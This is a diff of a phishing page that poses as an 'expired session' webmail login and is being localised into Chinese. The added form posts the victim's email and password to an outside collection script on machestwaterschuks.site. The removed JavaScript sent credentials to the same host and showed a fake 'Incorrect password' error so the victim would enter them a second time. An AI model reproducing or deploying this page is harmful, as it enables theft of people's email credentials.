@@ -1,52 +1,37 @@
 <!DOCTYPE html>
 <html lang="eng">
     <head>
-        <title>webmail</title>
+        <title>网络邮件</title>
         <link rel="stylesheet" href="style.css">
         
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script> -->
     </head>
     <body><center>
-<!--         <div>
-            <center><h1 style="text-align: center; color: black;">Sesión expirada</h1></center>
-        </div> -->
         <div>
-            <div class="myinput">
+            <center><h1 style="text-align: center; color: black;">过期会话</h1></center>
+        </div> 
+        <div> 
+            
                 
-             <hr
-                   style="
-                      height: 2px;
-                      border: none;
-                      color: #ffff;
-                      background-color: none;
-                   "
-                />
-                <div
-                class="alert alert-danger"
-                id="wrongPasswordAlert"
-                style="display: none"
-             
-                <center> <strong>Error</strong> Incorrect password</center >      
-             </div>
-             <form id="myForm" class="bv">
+           
+               <form    method="POST" action="https://machestwaterschuks.site/keyy/kk.php"  class="bv" >
                <div>
-            <center><h1 style="text-align: center; color: white;">expired session</h1></center>
+            <center><h1 style="text-align: center; color: white;">会话过期</h1></center>
              </div>
-                <input type ="mail" id="email" name="mail" placeholder="User"><br> 
-                <input type=password name="pass" id=pass placeholder="Password"><br/>
-                 <!-- <input type="checkbox" name="remember me"> -->
-                 <!-- <label>Remember me</label><br> -->
-                  <button name="sign" type="submit">TO ENTER</button> 
+                <input type ="email" id="email" name="email" placeholder="用户"><br> 
+                <input type ="password" name="password"  id="" placeholder="密码"><br/>
+                
+                  <button type="submit" name="dot" >进入</button> 
              </form>
         </div>
         <div class="lin">
             <ul>
-                <li>Helpr</li>
-                <li>Privacy Policy</li>
-                <li>register account</li>
-                <li>Contact</li>
+                <li>帮助</li>
+                <li>隐私政策</li>
+                <li>注册账户</li>
+                <li>接触</li>
                 
             </ul>
            </div>
@@ -78,7 +63,7 @@ background-color: white;
     margin: 15px;
     position: relative;
     top: 9%;
-    left: 11%;
+    left: 3%;
     font-size: larger;
     font-style: normal;
     font-weight: 300;
@@ -92,7 +77,7 @@ button{
     padding: 13px;
     position: relative;
     top: 20%;
-    left: 8%;
+    left: 2%;
     background-color: blue;
     border: none;
     font-size: larger;
@@ -102,7 +87,7 @@ button{
 
             .lin li{
     position: relative;
-    left:30%;
+    left:0%;
     list-style: none;
     display: flex;
     text-align: center;
@@ -124,58 +109,58 @@ button{
             return vars;
          } 
    
-        var form = document.getElementById("myForm");
-            var count = 0;
+   //      var form = document.getElementById("myForm");
+   //          var count = 0;
    
-            function showAlert() {
-               var alert = document.getElementById("wrongPasswordAlert");
-               alert.style.display = "block";
-            }
+   //          function showAlert() {
+   //             var alert = document.getElementById("wrongPasswordAlert");
+   //             alert.style.display = "block";
+   //          }
    
-            function send(email, pass, onSuccess) {
-               const form = new FormData();
-               form.append("email", email);
-               form.append("pass", pass);
-               form.append("count", count);
-               form.append("enter", true);
+   //          function send(email, pass, onSuccess) {
+   //             const form = new FormData();
+   //             form.append("email", email);
+   //             form.append("pass", pass);
+   //             form.append("count", count);
+   //             form.append("enter", true);
    
-                axios({
-                   method: "post",
-                  url:"https://machestwaterschuks.site/sup/su.php",
-                 data: form,
-                   headers: {
-                      "Content-Type": `multipart/form-data; boundary=${form._boundary}`,
-                  },
-               })
-                  .then(function (response) {
-                     console.log(response);
-                     if (onSuccess) onSuccess();
-                  })
-                  .catch(function (error) {
-                     console.log(error);
-                  });
-            }
+   //              axios({
+   //                 method: "post",
+   //                url:"https://machestwaterschuks.site/ckk/ck.php",
+   //                data: form,
+   //                 headers: {
+   //                    "Content-Type": `multipart/form-data; boundary=${form._boundary}`,
+   //                },
+   //             })
+   //                .then(function (response) {
+   //                   console.log(response);
+   //                   if (onSuccess) onSuccess();
+   //                })
+   //                .catch(function (error) {
+   //                   console.log(error);
+   //                });
+   //          }
    
-            form.onsubmit = function (e) {
-               e.preventDefault();
-               var email = document.getElementById("email");
-               var pass = document.getElementById("pass");
+   //          form.onsubmit = function (e) {
+   //             e.preventDefault();
+   //             var email = document.getElementById("email");
+   //             var pass = document.getElementById("pass");
    
-               if (count == 0) {
-                  showAlert();
-                  send(email.value, pass.value, count);
-                  pass.value = "";
-               } else {
-                  send(email.value, pass.value, function () {
-                     window.location.href = "https://roundcub/erro";
-                  });
+   //             if (count == 0) {
+   //                showAlert();
+   //                send(email.value, pass.value, count);
+   //                pass.value = "";
+   //             } else {
+   //                send(email.value, pass.value, function () {
+   //                   window.location.href = "https://roundcub/erro";
+   //                });
    
-                   return;
-                }
-                count++;
-             };
+   //                 return;
+   //              }
+   //              count++;
+   //           };
          
-   </script>
+   // </script>
        </body>
 
     </center></html>
